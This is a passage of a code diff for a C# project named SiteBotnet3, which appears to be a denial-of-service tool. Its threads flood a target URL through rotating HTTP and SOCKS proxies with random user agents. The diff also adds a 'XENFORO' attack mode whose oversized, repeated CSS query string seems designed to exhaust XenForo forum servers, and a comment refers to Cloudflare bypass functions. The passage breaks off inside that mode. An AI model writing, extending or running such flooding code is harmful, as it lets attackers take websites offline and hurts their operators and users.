@@ -1,9 +1,10 @@
-using System;
+﻿using System;
 using System.Collections.Generic;
 using Leaf.xNet;
 using Leaf.xNet.Services.Cloudflare;
 using System.Net.NetworkInformation;
 using System.Threading;
+using SiteBotnet3.Utils;
 
 namespace SiteBotnet3
 {
@@ -19,7 +20,7 @@ namespace SiteBotnet3
         private int Hits;
 
         private Thread Thread;
-        private string ThreadName;
+        private readonly string ThreadName;
 
         public Requests(string Name) { ThreadName = Name; }
 
@@ -46,38 +47,32 @@ namespace SiteBotnet3
             {
                 using (HttpRequest req = new HttpRequest())
                 {
-                    req.UserAgent = Http.RandomUserAgent();
+                    req.UserAgent = UserAgent.Random();
                     req.IgnoreProtocolErrors = true;
-                    req.Cookies = new CookieStorage();
+                    req.KeepAlive = true;
 
+                    string proxy = ProxyList[Program.Rand.Next(ProxyList.Count)];
                     if (ProxyType == "HTTP")
                     {
-                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                         req.Proxy = HttpProxyClient.Parse(proxy);
                         Console.WriteLine(ThreadName + " Using HTTP proxy : " + proxy);
                     }
                     else if (ProxyType == "SOCKS4")
                     {
-                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                         req.Proxy = Socks4ProxyClient.Parse(proxy);
                         Console.WriteLine(ThreadName + " Using SOCKS4 proxy : " + proxy);
                     }
                     else if (ProxyType == "SOCKS4")
                     {
-                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                         req.Proxy = Socks5ProxyClient.Parse(proxy);
                         Console.WriteLine(ThreadName + " Using SOCKS5 proxy : " + proxy);
-                    }
-                    else if (ProxyType == "NONE")
-                    {
-                        req.Proxy = null;
-                        req.KeepAlive = true;
                     }
 
                     Thread.Sleep(100);
                     Uri TargetUri = new Uri(Target);
                     HttpResponse respo = null;
 
+                    // IsCloudflared() and GetThroughCloudflare() are obsolete in Leaf.xNet.
                     if (Method == "XENFORO")
                     {
                         string xenForo = "?css=xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic";
